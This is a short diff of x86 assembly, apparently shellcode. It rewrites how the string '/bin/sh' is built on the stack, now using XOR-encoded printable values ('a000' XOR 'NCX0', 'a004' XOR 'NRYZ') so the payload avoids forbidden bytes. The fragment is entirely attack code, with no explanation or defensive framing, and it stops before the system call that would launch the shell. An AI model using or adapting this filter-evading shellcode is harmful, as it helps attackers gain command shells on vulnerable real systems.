@@ -54,33 +54,17 @@ start_listing:
     pop ecx
     pop edx
 
-
-    ; Push \0 to the stack
-    push 'xxxx'
+    ; Push '/sh\0'
+    push 'a000'
     pop eax
-    xor eax, 'xxxx'
+    xor eax, 'NCX0'
+    push eax
 
-    ; Push /bin/sh to the stack
-    push '/sh0'
-
-    ; moving esp to end of above string
-    inc esp
-    inc esp
-    inc esp
-    inc esp ; now right after '0'
-
-    ; move additional 3 bytes to align '0' to be overwritten by pushing 4 bytes
-    inc esp
-    inc esp
-    inc esp
-    push eax ; clear '0' (and the following 3 bytes)
-
-    ; move back stack pointer
-    dec esp
-    dec esp
-    dec esp
-
-    push '/bin'
+    ; Push '/bin'
+    push 'a004'
+    pop eax
+    xor eax, 'NRYZ'
+    push eax
 
     ; mov esp ebx
     push esp
